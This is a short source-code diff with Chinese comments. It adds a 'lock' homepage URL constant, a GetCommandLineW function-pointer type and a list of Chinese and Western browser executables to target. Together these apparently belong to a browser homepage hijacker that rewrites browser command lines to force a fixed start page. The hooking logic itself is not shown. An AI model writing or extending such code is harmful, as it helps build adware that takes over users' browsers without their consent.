@@ -14,6 +14,8 @@
 #define ASSERT assert
 #define ARR_COUNT(_array) (sizeof(_array) / sizeof(_array[0]))
 
+#define URL_HOMEADDR	L"http://www.iehome.com/?lock"
+
 typedef LPWSTR(WINAPI *__pfnGetCommandLineW) (VOID);
 
 namespace Global {
@@ -77,11 +79,13 @@ namespace {
 		_W("chrome.exe")/* Chrome 核心浏览器*/,
 		_W("qqbrowser.exe")/* QQ 核心浏览器*/,
 		_W("twchrome.exe")/* 世界之窗 核心浏览器*/,
-		_W("sogouexplorer.exe")/* 搜狗 核心浏览器*/,
 		_W("baidubrowser.exe")/* 百度 核心浏览器*/, //会出现无法打开的情况
 		_W("2345explorer.exe")/* 2345 核心浏览器*/,
 
+		_W("sogouexplorer.exe")/* 搜狗 核心浏览器*/,
 		_W("f1browser.exe")/* F1 核心浏览器*/,
+
+		_W("theworld.exe")/* 遨游 核心浏览器*/,
 
 		_W("yidian.exe")/* 一点浏览器 湖南岳阳 应该是当地实名制公司的*/
 
